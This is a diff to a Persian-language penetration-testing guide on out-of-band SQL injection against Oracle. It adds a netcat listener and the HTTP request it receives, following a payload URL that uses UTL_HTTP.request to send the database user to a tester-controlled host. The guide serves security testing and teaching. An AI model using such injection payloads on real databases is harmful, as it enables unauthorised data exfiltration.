@@ -45,6 +45,12 @@ http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'
 ```
 در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:
 
+'''
+/home/tester/nc -nLp 80
+GET /SCOTT HTTP/1.1 
+Host: testerserver.com 
+Connection: close
+'''
 ### تکنیک Time Delay Exploitation Technique
 
 تکنیک Time Delay Exploitation زمانی بسیار مفید است که تست نفوذگر آسیب پذیری Blind SQL Injection ای را پیدا کند که در آن نتیجه یک عملیات، مشخص نیست.
